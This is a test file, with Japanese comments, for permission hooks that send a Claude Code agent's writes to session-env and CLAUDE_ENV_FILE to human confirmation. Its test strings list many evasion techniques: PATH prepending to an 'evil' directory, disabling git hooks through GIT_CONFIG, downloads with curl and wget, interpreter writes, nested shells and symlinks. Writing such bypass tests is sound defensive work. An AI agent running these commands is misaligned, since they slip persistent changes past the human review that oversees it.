// Issue #1270: Claude Code の Bash は各コマンドの前に ~/.claude/session-env/<セッション>/*.sh（CLAUDE_ENV_FILE が指すファイル）を読む。
// フックはその中身を見ないので、そこへの書き込み（Bash、Write、Edit、MultiEdit）は人の確認（ask）に回す。
// 判定は名前 session-env のパスの区切りと、起動元の CLAUDE_ENV_FILE の絶対パスで行う（CLAUDE_CONFIG_DIR で場所を替えても名前は同じ）。
// 読むだけ（cat、ls、grep、echo $CLAUDE_ENV_FILE、コピーの元）は通す。
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { judgeBash } from './bash-rules.mjs';
import { judgeSessionEnvWrite } from './file-rules.mjs';

const decision = (command, env = {}, cwd = '/repo') => judgeBash(command, { cwd, branchOf: () => '1270-x', env })?.[0] ?? 'allow';
const fileDecision = (filePath, envFile) => judgeSessionEnvWrite(filePath, { envFile })?.[0] ?? 'allow';

// 架空のセッションの環境ファイル。~ の形と絶対パスの形
const S = '~/.claude/session-env/abc/x.sh';
const ABS = '/home/dev/.claude/session-env/abc/x.sh';
// session-env の名前を含まない場所を指す起動元の CLAUDE_ENV_FILE
const ENV_FILE = '/var/tmp/envfile.sh';
const OUTSIDE = { CLAUDE_ENV_FILE: ENV_FILE };
const INSIDE = { CLAUDE_ENV_FILE: ABS };

// ---- 完了条件 ----

// 再現の手順: session-env に git の設定、gh の宛先、PATH の前置きを書き足す
for (const line of [
  'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.push GIT_CONFIG_VALUE_0=HEAD:main',
  'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/nohooks',
  'export GH_REPO=other/repo',
  'export PATH=/tmp/evil-bin:$PATH',
]) {
  test(`[完了条件] 再現の手順のリダイレクトは確認に回す: ${line}`, () => {
    assert.equal(decision(`echo '${line}' >> ${S}`), 'ask');
  });
  test(`[完了条件] 再現の手順の tee は確認に回す: ${line}`, () => {
    assert.equal(decision(`echo '${line}' | tee -a ${S}`), 'ask');
  });
}

test('[完了条件] リダイレクト: ~ の形は確認、別の場所への同じ書き込みは通す', () => {
  assert.equal(decision(`echo 'export X=1' >> ${S}`), 'ask');
  assert.equal(decision(`echo 'export X=1' >> /tmp/out.sh`), 'allow');
});

test('[完了条件] リダイレクト: 絶対パスの形は確認', () => {
  assert.equal(decision(`echo 'export X=1' >> ${ABS}`), 'ask');
});

test('[完了条件] tee: session-env は確認、別の場所は通す', () => {
  assert.equal(decision(`echo 'export X=1' | tee -a ${S}`), 'ask');
  assert.equal(decision(`echo 'export X=1' | tee -a /tmp/out.sh`), 'allow');
});

test('[完了条件] Write の判定: session-env の下は確認、ほかは通す', () => {
  assert.equal(fileDecision(path.join(os.homedir(), '.claude/session-env/abc/x.sh')), 'ask');
  assert.equal(fileDecision(ABS), 'ask');
  assert.equal(fileDecision('/tmp/out.sh'), 'allow');
});

test('[完了条件] Write の判定: 当たれば [ask, 理由] を返し、当たらなければ null', () => {
  const verdict = judgeSessionEnvWrite(ABS, {});
  assert.equal(verdict?.[0], 'ask');
  assert.equal(typeof verdict?.[1], 'string');
  assert.ok(verdict[1].length > 0);
  assert.equal(judgeSessionEnvWrite('/tmp/out.sh', {}), null);
  // 2つ目の引数を省いても呼べる
  assert.equal(judgeSessionEnvWrite('/tmp/out.sh'), null);
});

// $CLAUDE_ENV_FILE の展開は、起動元に値が無くても、session-env の外や中を指していても確認に回す
for (const target of ['"$CLAUDE_ENV_FILE"', '$CLAUDE_ENV_FILE', '${CLAUDE_ENV_FILE}', '"${CLAUDE_ENV_FILE}"', '"${CLAUDE_ENV_FILE:-/tmp/x}"']) {
  for (const [name, env] of [['起動元に無い', {}], ['起動元が外を指す', OUTSIDE], ['起動元が session-env を指す', INSIDE]]) {
    test(`[完了条件] $CLAUDE_ENV_FILE の展開への書き込みは確認（${name}）: >> ${target}`, () => {
      assert.equal(decision(`echo 'export X=1' >> ${target}`, env), 'ask');
    });
  }
}

test('[完了条件] 起動元の CLAUDE_ENV_FILE の絶対パスへの書き込みは確認、起動元に無ければ通す', () => {
  assert.equal(decision(`echo 'export X=1' >> ${ENV_FILE}`, OUTSIDE), 'ask');
  assert.equal(decision(`echo 'export X=1' >> ${ENV_FILE}`, {}), 'allow');
});

for (const command of ['ls ~/.claude/session-env', 'ls -la ~/.claude/session-env/abc', 'cat "$CLAUDE_ENV_FILE"', `cat ${S}`, 'grep -r PATH ~/.claude/session-env', 'echo $CLAUDE_ENV_FILE', 'echo "$CLAUDE_ENV_FILE"']) {
  for (const [name, env] of [['起動元に無い', {}], ['起動元が外を指す', OUTSIDE], ['起動元が session-env を指す', INSIDE]]) {
    test(`[完了条件] 読むだけの形は通す（${name}）: ${command}`, () => assert.equal(decision(command, env), 'allow'));
  }
}

// ---- すり抜け（Bash） ----

for (const command of [
  // リダイレクトの種類
  `echo x > ${S}`,
  `echo x >> ${S}`,
  `echo x &> ${S}`,
  `echo x &>> ${S}`,
  `echo x >| ${S}`,
  `echo x 1>> ${S}`,
  `echo x 2> ${S}`,
  `echo x >>${S}`,
  `echo x>>${S}`,
  `printf 'export X=1\\n' >> ${S}`,
  `cat /tmp/a.sh > ${S} 2>/dev/null`,
  `exec >> ${S}`,
  // tee
  `echo x | tee ${S}`,
  `tee -a ${S} < /tmp/a.sh`,
  `echo x | sudo tee -a ${S}`,
  // ヒアドキュメントとヒアストリング
  `cat <<EOF >> ${S}\nexport X=1\nEOF`,
  `cat > ${S} <<'EOF'\nexport X=1\nEOF`,
  `tee -a ${S} <<< 'export X=1'`,
  // 作業場所を移ってからの相対パス
  `cd ~/.claude/session-env/abc && echo 'export X=1' >> x.sh`,
  `pushd ~/.claude/session-env/abc && echo 'export X=1' >> x.sh`,
  `cd /home/dev/.claude/session-env/abc; echo 'export X=1' > y.sh`,
  `cd ~/.claude && echo x >> session-env/abc/x.sh`,
  // コピーの宛先
  `cp /tmp/a.sh ${S}`,
  `cp /tmp/a.sh ~/.claude/session-env/abc/`,
  `cp -t ~/.claude/session-env/abc /tmp/a.sh`,
  `mv /tmp/a.sh ${S}`,
  `install /tmp/a.sh ${S}`,
  `install -m 644 /tmp/a.sh ${ABS}`,
  `rsync /tmp/a.sh ${S}`,
  `rsync -a /tmp/evil/ ~/.claude/session-env/abc/`,
  `scp /tmp/a.sh ${S}`,
  // その場の書き換え
  `sed -i 's/a/b/' ${S}`,
  `sed -i.bak 's/a/b/' ${ABS}`,
  `perl -i -pe 's/a/b/' ${S}`,
  // dd、ダウンロード
  `dd if=/tmp/a.sh of=${ABS}`,
  `curl -o ${S} https://example.com/a.sh`,
  `curl -fsSLo ${S} https://example.com/a.sh`,
  `curl --output-dir ~/.claude/session-env/abc -O https://example.com/x.sh`,
  `wget -O ${S} https://example.com/a.sh`,
  `wget -P ~/.claude/session-env/abc https://example.com/x.sh`,
  // リンク（先も元も）。元が session-env のリンクは、後でリンクへ書くと session-env に届く
  `ln -s /tmp/a.sh ${S}`,
  `ln -sf /tmp/a.sh ${ABS}`,
  `ln -s ~/.claude/session-env/abc /tmp/alias`,
  `ln -s ${S} /tmp/link.sh`,
  `ln ${ABS} /tmp/hard.sh`,
  // インタープリタの本文
  `python3 -c 'open("${ABS}","a").write("export X=1\\n")'`,
  `python3 -c 'import os; open(os.path.expanduser("~/.claude/session-env/abc/x.sh"),"a").write("export X=1")'`,
  `node -e 'require("fs").appendFileSync("${ABS}","export X=1\\n")'`,
  `ruby -e 'File.write("${ABS}", "export X=1", mode: "a")'`,
  `python3 <<'EOF'\nopen("${ABS}","a").write("export X=1\\n")\nEOF`,
  // 入れ子のシェル
  `bash -c "echo 'export X=1' >> ${S}"`,
  `sh -c "echo x >> ${S}"`,
  `bash -c 'bash -c "echo x >> ${S}"'`,
  `eval "echo x >> ${S}"`,
  // 引用符と展開
  `echo x >> "$HOME/.claude/session-env/abc/x.sh"`,
  `echo x >> $HOME/.claude/session-env/abc/x.sh`,
  `echo x >> \${HOME}/.claude/session-env/abc/x.sh`,
  `echo x >> '${ABS}'`,
  `echo x >> "${ABS}"`,
  `echo x >> ~/.claude/"session-env"/abc/x.sh`,
  `echo x >> ~/.claude/session-{env,x}/abc/x.sh`,
  `echo x >> "$CLAUDE_CONFIG_DIR/session-env/abc/x.sh"`,
  // CLAUDE_CONFIG_DIR で替えた場所。名前は同じ
  `echo x >> /opt/claude-config/session-env/abc/x.sh`,
  `echo x >> /x/y/session-env/abc/z.sh`,
  `echo x >> /home/dev/.claude/session-env/abc/nested/deeper.sh`,
  // 既存の書き込み先の判定が見る道具
  `find /tmp -name a -fprint ${S}`,
  `find /tmp -name a -fprintf ${ABS} '%p\\n'`,
  `git diff --output=${ABS}`,
  `git format-patch -o ~/.claude/session-env/abc HEAD~1`,
  `tar -xf /tmp/a.tar -C ~/.claude/session-env/abc`,
  `truncate -s 0 ${S}`,
]) {
  test(`[すり抜け] session-env への書き込みは確認: ${command}`, () => assert.equal(decision(command), 'ask'));
}

// $CLAUDE_ENV_FILE の展開を、道具と形を替えて書き込み先にする。起動元の値が外を指すときも中を指すときも同じ
for (const command of [
  'echo x >>$CLAUDE_ENV_FILE',
  'echo x > "$CLAUDE_ENV_FILE"',
  'echo x | tee -a "$CLAUDE_ENV_FILE"',
  'tee -a "$CLAUDE_ENV_FILE" <<< "export X=1"',
  'cat <<EOF >> "$CLAUDE_ENV_FILE"\nexport X=1\nEOF',
  'cp /tmp/a.sh "$CLAUDE_ENV_FILE"',
  'mv /tmp/a.sh "${CLAUDE_ENV_FILE}"',
  `sed -i 's/a/b/' "$CLAUDE_ENV_FILE"`,
  'echo x >> ${CLAUDE_ENV_FILE:=/tmp/x}',
  // 同じディレクトリの別の *.sh も Bash が読む
  'echo x >> "${CLAUDE_ENV_FILE%/*}/evil.sh"',
  'echo x >> "$(dirname "$CLAUDE_ENV_FILE")/evil.sh"',
  'ln -sf "$CLAUDE_ENV_FILE" /tmp/alias.sh',
  `bash -c 'echo x >> "$CLAUDE_ENV_FILE"'`,
  `sh -c 'printf "%s\\n" x >> "$CLAUDE_ENV_FILE"'`,
]) {
  for (const [name, env] of [['起動元に無い', {}], ['起動元が外を指す', OUTSIDE], ['起動元が session-env を指す', INSIDE]]) {
    test(`[すり抜け] $CLAUDE_ENV_FILE の展開への書き込みは確認（${name}）: ${command}`, () => assert.equal(decision(command, env), 'ask'));
  }
}

// 起動元の CLAUDE_ENV_FILE が session-env の名前を含まない場所（/var/tmp/envfile.sh）を指すときの、その絶対パスへの書き込み
for (const command of [
  `echo x >> ${ENV_FILE}`,
  `echo x > ${ENV_FILE}`,
  `echo x | tee -a ${ENV_FILE}`,
  `cp /tmp/a.sh ${ENV_FILE}`,
  `sed -i 's/a/b/' ${ENV_FILE}`,
  `cd /var/tmp && echo x >> envfile.sh`,
  'echo x >> /var/tmp//envfile.sh',
  'echo x >> /var/tmp/./envfile.sh',
  `ln -s ${ENV_FILE} /tmp/alias.sh`,
  `bash -c "echo x >> ${ENV_FILE}"`,
  `python3 -c 'open("${ENV_FILE}","a").write("export X=1\\n")'`,
]) {
  test(`[すり抜け] 起動元の CLAUDE_ENV_FILE の場所への書き込みは確認: ${command}`, () => assert.equal(decision(command, OUTSIDE), 'ask'));
}

test('[すり抜け] 作業場所が session-env の中なら、相対パスへの書き込みも確認', () => {
  assert.equal(decision('echo x >> x.sh', {}, '/home/dev/.claude/session-env/abc'), 'ask');
});

test('[すり抜け] 作業場所が起動元の CLAUDE_ENV_FILE のディレクトリなら、その名前への相対の書き込みも確認', () => {
  assert.equal(decision('echo x >> envfile.sh', OUTSIDE, '/var/tmp'), 'ask');
});

test('[すり抜け] CLAUDE_ENV_FILE のディレクトリへ cd してからの相対の書き込みは確認', () => {
  assert.equal(decision(`cd "$(dirname "$CLAUDE_ENV_FILE")" && echo x >> evil.sh`), 'ask');
});

test('[すり抜け] インタープリタの本文で CLAUDE_ENV_FILE の名前を書き込み先にする形は確認', () => {
  assert.equal(decision(`node -e 'require("fs").appendFileSync(process.env.CLAUDE_ENV_FILE, "export X=1\\n")'`), 'ask');
  assert.equal(decision(`python3 -c 'import os; open(os.environ["CLAUDE_ENV_FILE"],"a").write("export X=1")'`), 'ask');
});

test('[すり抜け] 引用符で囲んだ ~ は展開されないので、確認でも通しでもよい（deny にはしない）', () => {
  // "~/.claude/session-env/..." は作業場所の下の ~ という名前のディレクトリを指す。名前の照合で当たっても当たらなくてもよい
  assert.notEqual(decision(`echo x >> "~/.claude/session-env/abc/x.sh"`), 'deny');
});

// ---- 既知の限界 ----
// 変数を経由した書き込み（f=~/.claude/session-env/x/y.sh; echo x >> "$f"）は塞がない（Issue #1270 の「やらないこと」）。
// 結果を問わないので、ここでは判定を求めない。

// ---- 通す（Bash） ----

for (const command of [
  'ls ~/.claude/session-env',
  'ls -la "$(dirname "$CLAUDE_ENV_FILE")"',
  'cat "$CLAUDE_ENV_FILE"',
  `cat ${S} 2>/dev/null`,
  'head -n 3 "$CLAUDE_ENV_FILE"',
  'wc -l < "$CLAUDE_ENV_FILE"',
  'grep -r PATH ~/.claude/session-env',
  'grep PATH "$CLAUDE_ENV_FILE" > /tmp/out.txt',
  `sed -n 1p ${S}`,
  `diff ${S} /tmp/a.sh`,
  'test -f "$CLAUDE_ENV_FILE" && echo yes',
  '[ -n "$CLAUDE_ENV_FILE" ] && cat "$CLAUDE_ENV_FILE"',
  'echo $CLAUDE_ENV_FILE',
  'echo "$CLAUDE_ENV_FILE" > /tmp/where.txt',
  'echo "export X=1"',
  'echo "export X=1" > /tmp/out.sh',
  `echo 'session-env' > /tmp/note.txt`,
  // コピーの元
  'cp ~/.claude/session-env/abc/x.sh /tmp/',
  'cp "$CLAUDE_ENV_FILE" /tmp/env-backup.sh',
  'rsync -a ~/.claude/session-env/ /tmp/backup/',
  `dd if=${ABS} of=/tmp/copy.sh`,
  `tee /tmp/log.txt < ${S}`,
  'tar -cf /tmp/b.tar ~/.claude/session-env',
  `find ~/.claude/session-env -name '*.sh'`,
  `find ~/.claude/session-env -name '*.sh' -exec cat {} +`,
  // 名前が違う
  'echo x > /tmp/session-envx/a.sh',
  'echo x > /tmp/my-session-env/a.sh',
  'echo x > /tmp/session-env.sh',
  'echo x >> ~/.claude/session-envs/abc/x.sh',
  // 通常の作業
  'git status',
  'pnpm test',
  'git commit -m "CLAUDE_ENV_FILE の扱いを直す"',
  'git log --grep=session-env',
]) {
  for (const [name, env] of [['起動元に無い', {}], ['起動元が外を指す', OUTSIDE], ['起動元が session-env を指す', INSIDE]]) {
    test(`[通す] ${name}: ${command}`, () => assert.equal(decision(command, env), 'allow'));
  }
}

test('[通す] 起動元の CLAUDE_ENV_FILE の場所を読むだけなら通す', () => {
  assert.equal(decision(`cat ${ENV_FILE}`, OUTSIDE), 'allow');
  assert.equal(decision(`cp ${ENV_FILE} /tmp/`, OUTSIDE), 'allow');
});

test('[通す] 起動元の CLAUDE_ENV_FILE と別の名前への書き込みは通す', () => {
  assert.equal(decision('echo x >> /var/tmp/other.sh', OUTSIDE), 'allow');
  assert.equal(decision(`echo x >> ${ENV_FILE}.bak`, OUTSIDE), 'allow');
});

// ---- 前に塞いだ手口（代表） ----

test('[前の判定] .claude/settings.json への書き込みはこれまでどおり確認', () => {
  assert.equal(decision('echo x > .claude/settings.json'), 'ask');
  assert.equal(decision(`echo '{}' | tee .claude/settings.local.json`, OUTSIDE), 'ask');
});

// ---- Write、Edit、MultiEdit の判定（judgeSessionEnvWrite） ----

for (const filePath of [
  path.join(os.homedir(), '.claude/session-env/abc/x.sh'),
  ABS,
  '/x/y/session-env/abc/z.sh',
  '/opt/claude-config/session-env/abc/x.sh',
  '/home/dev/.claude/session-env/abc/nested/deeper.sh',
  '/home/dev/.claude/session-env/abc/evil.sh',
  '/home/dev/.claude/session-env/abc.sh',
]) {
  test(`[すり抜け] Write の判定: session-env の下は確認: ${filePath}`, () => {
    assert.equal(fileDecision(filePath), 'ask');
    assert.equal(fileDecision(filePath, ''), 'ask');
    assert.equal(fileDecision(filePath, ENV_FILE), 'ask');
  });
}

test('[すり抜け] Write の判定: 起動元の CLAUDE_ENV_FILE が指すファイルは、session-env の名前を含まなくても確認', () => {
  assert.equal(fileDecision(ENV_FILE, ENV_FILE), 'ask');
});

test('[すり抜け] Write の判定: 起動元の CLAUDE_ENV_FILE の書き方が正規化されていなくても同じファイルなら確認', () => {
  assert.equal(fileDecision(ENV_FILE, '/var/tmp//envfile.sh'), 'ask');
  assert.equal(fileDecision(ENV_FILE, '/var/tmp/./envfile.sh'), 'ask');
});

for (const [filePath, envFile] of [
  [ENV_FILE, undefined],
  [ENV_FILE, ''],
  ['/var/tmp/other.sh', ENV_FILE],
  [`${ENV_FILE}.bak`, ENV_FILE],
  ['/tmp/session-envx/a.sh', undefined],
  ['/tmp/my-session-env/a.sh', undefined],
  ['/tmp/session-env.sh', undefined],
  ['/home/dev/.claude/session-envs/abc/x.sh', undefined],
  ['/home/dev/app/src/server/x.ts', ENV_FILE],
  ['/home/dev/app/docs/session-env.md', undefined],
]) {
  test(`[通す] Write の判定: ${filePath}（起動元 ${envFile === undefined ? '無し' : JSON.stringify(envFile)}）`, () => {
    assert.equal(judgeSessionEnvWrite(filePath, { envFile }), null);
  });
}

// ---- ランタイム（入口のフックを起動する） ----

describe('[ランタイム]', () => {
  const hooks = path.dirname(fileURLToPath(import.meta.url));
  const tmp = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'guard-1270-')));
  after(() => rmSync(tmp, { recursive: true, force: true }));

  // 起動元の CLAUDE_ENV_FILE と GIT_* は、テストを走らせる環境の値を持ち込まない
  const cleanEnv = Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith('GIT_') && key !== 'CLAUDE_ENV_FILE'));
  const run = (script, input, env = {}) =>
    spawnSync(process.execPath, [path.join(hooks, script)], {
      input: JSON.stringify(input),
      encoding: 'utf8',
      env: { ...cleanEnv, CLAUDE_PROJECT_DIR: '', ...env },
    });
  const decisionOf = (result) => {
    assert.equal(result.status, 0, result.stderr);
    return result.stdout === '' ? 'allow' : JSON.parse(result.stdout).hookSpecificOutput.permissionDecision;
  };
  const bash = (command, env, cwd = tmp) => decisionOf(run('guard-bash.mjs', { tool_name: 'Bash', cwd, tool_input: { command } }, env));
  const write = (filePath, env, cwd = tmp) =>
    decisionOf(run('guard-files.mjs', { tool_name: 'Write', cwd, tool_input: { file_path: filePath, content: 'export X=1\n' } }, env));
  const edit = (filePath, env) =>
    decisionOf(run('guard-files.mjs', { tool_name: 'Edit', cwd: tmp, tool_input: { file_path: filePath, old_string: 'a', new_string: 'export X=1' } }, env));
  const multiEdit = (filePath, env) =>
    decisionOf(
      run('guard-files.mjs', { tool_name: 'MultiEdit', cwd: tmp, tool_input: { file_path: filePath, edits: [{ old_string: 'a', new_string: 'export X=1' }] } }, env),
    );

  // リポジトリの外の、session-env の下と、CLAUDE_ENV_FILE が指す場所
  const sessionDir = path.join(tmp, 'home/.claude/session-env/abc');
  mkdirSync(sessionDir, { recursive: true });
  const sessionFile = path.join(sessionDir, 'x.sh');
  writeFileSync(sessionFile, 'a\n');
  const configDir = path.join(tmp, 'opt/claude-config/session-env/abc');
  mkdirSync(configDir, { recursive: true });
  const envFile = path.join(tmp, 'var/envfile.sh');
  mkdirSync(path.dirname(envFile), { recursive: true });
  writeFileSync(envFile, 'a\n');
  const alias = path.join(tmp, 'alias');
  symlinkSync(sessionDir, alias);
  mkdirSync(path.join(tmp, 'other'));
  mkdirSync(path.join(tmp, 'session-envx'));
  mkdirSync(path.join(tmp, 'my-session-env'));

  test('[ランタイム] guard-files: Write の file_path がリポジトリの外の session-env の下なら ask', () => {
    assert.equal(write(sessionFile), 'ask');
    assert.equal(write(path.join(sessionDir, 'new.sh')), 'ask');
  });

  test('[ランタイム] guard-files: まだ無い session-env のディレクトリの下への Write も ask', () => {
    assert.equal(write(path.join(tmp, 'fresh/.claude/session-env/def/x.sh')), 'ask');
  });

  test('[ランタイム] guard-files: Edit と MultiEdit も ask', () => {
    assert.equal(edit(sessionFile), 'ask');
    assert.equal(multiEdit(sessionFile), 'ask');
  });

  test('[ランタイム] guard-files: cwd から解決する相対の file_path も ask', () => {
    assert.equal(write('session-env/abc/y.sh', {}, path.join(tmp, 'home/.claude')), 'ask');
    assert.equal(write('x.sh', {}, sessionDir), 'ask');
  });

  test('[ランタイム] guard-files: CLAUDE_CONFIG_DIR で替えた場所の session-env も ask', () => {
    assert.equal(write(path.join(configDir, 'x.sh')), 'ask');
  });

  test('[ランタイム] guard-files: 起動元の CLAUDE_ENV_FILE が指す任意の場所のファイルは ask、起動元に無ければ通す', () => {
    assert.equal(write(envFile, { CLAUDE_ENV_FILE: envFile }), 'ask');
    assert.equal(edit(envFile, { CLAUDE_ENV_FILE: envFile }), 'ask');
    assert.equal(multiEdit(envFile, { CLAUDE_ENV_FILE: envFile }), 'ask');
    assert.equal(write(envFile), 'allow');
  });

  test('[ランタイム] guard-files: session-env のディレクトリを指すシンボリックリンクを通した Write と Edit も ask', () => {
    assert.equal(edit(path.join(alias, 'x.sh')), 'ask');
    assert.equal(write(path.join(alias, 'new.sh')), 'ask');
  });

  test('[ランタイム] guard-files: リポジトリの外の別の名前の場所は通す', () => {
    assert.equal(write(path.join(tmp, 'other/x.sh')), 'allow');
    assert.equal(write(path.join(tmp, 'session-envx/a.sh')), 'allow');
    assert.equal(write(path.join(tmp, 'my-session-env/a.sh')), 'allow');
    assert.equal(write(path.join(tmp, 'var/other.sh'), { CLAUDE_ENV_FILE: envFile }), 'allow');
  });

  test('[ランタイム] guard-files: リポジトリの中の .claude/settings.json はこれまでどおり ask', () => {
    const repo = path.join(tmp, 'repo');
    mkdirSync(path.join(repo, '.claude'), { recursive: true });
    const init = spawnSync('git', ['init', '-q', '-b', '1270-x', repo], { encoding: 'utf8', env: cleanEnv });
    assert.equal(init.status, 0, init.stderr);
    assert.equal(write(path.join(repo, '.claude/settings.json'), {}, repo), 'ask');
    assert.equal(write(path.join(repo, 'docs/x.md'), {}, repo), 'allow');
  });

  test('[ランタイム] guard-bash: 再現の手順の書き込みは ask', () => {
    assert.equal(bash(`echo 'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/x' >> ${S}`), 'ask');
    assert.equal(bash(`echo 'export GH_REPO=other/repo' | tee -a ${sessionFile}`), 'ask');
  });

  test('[ランタイム] guard-bash: $CLAUDE_ENV_FILE の展開への書き込みは ask', () => {
    assert.equal(bash('echo x >> "$CLAUDE_ENV_FILE"', { CLAUDE_ENV_FILE: envFile }), 'ask');
    assert.equal(bash('echo x >> "${CLAUDE_ENV_FILE:-/tmp/x}"'), 'ask');
  });

  test('[ランタイム] guard-bash: 起動元の CLAUDE_ENV_FILE が指す場所への書き込みは ask、起動元に無ければ通す', () => {
    assert.equal(bash(`echo x >> ${envFile}`, { CLAUDE_ENV_FILE: envFile }), 'ask');
    assert.equal(bash(`echo x >> ${envFile}`), 'allow');
  });

  test('[ランタイム] guard-bash: 読むだけの形は通す', () => {
    assert.equal(bash('cat "$CLAUDE_ENV_FILE"', { CLAUDE_ENV_FILE: envFile }), 'allow');
    assert.equal(bash('echo $CLAUDE_ENV_FILE', { CLAUDE_ENV_FILE: envFile }), 'allow');
    assert.equal(bash('ls ~/.claude/session-env'), 'allow');
    assert.equal(bash(`grep -r PATH ${path.join(tmp, 'home/.claude/session-env')}`), 'allow');
  });
});
